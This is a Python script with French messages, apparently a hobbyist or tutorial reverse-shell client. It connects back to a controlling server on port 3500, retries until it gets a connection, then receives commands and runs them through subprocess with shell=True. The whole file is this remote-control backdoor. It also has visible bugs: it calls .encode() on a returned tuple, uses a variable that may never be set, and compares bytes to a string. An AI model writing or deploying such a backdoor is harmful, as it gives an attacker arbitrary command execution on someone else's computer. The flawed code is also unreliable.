import socket
import time
import os
import subprocess

def shell():
	while True:
		data = s.recv(MAX_DATA_SIZE)
		if data == "os.getcwd":
			text = os.getcwd()
			s.sendall(text.encode())
		if not data:
			return 
		
		command = data.decode()

		if command == "exit":
			return "exit"

		command_split = command.split(" ")
		if len(command_split) == 2 and command_split[0] == "cd":
			try:
				os.chdir(command_split[1])
			except FileNotFoundError:
				print("ERREUR : ce répertoire n'exite pas")
		else:
			resultat = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)  # dir sur PC

			return resultat.stdout, resultat.stderr


HOST_IP = "127.0.0.1"
HOST_PORT = 3500
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")

while True:
	try:
		s = socket.socket()
		s.connect((HOST_IP, HOST_PORT))
	except ConnectionRefusedError:
		print("ERREUR : impossible de se connecter au serveur. Reconnexion... ")
		time.sleep(4)
	else:
		print("Connecté au serveur")
		break

while True:
	commande_data = s.recv(MAX_DATA_SIZE)
	if not commande_data:
		break
	commande = commande_data.decode()
	print("Commande : ", commande)
	if commande == "shell":
		reponse = shell()
	s.sendall(reponse.encode())
s.close()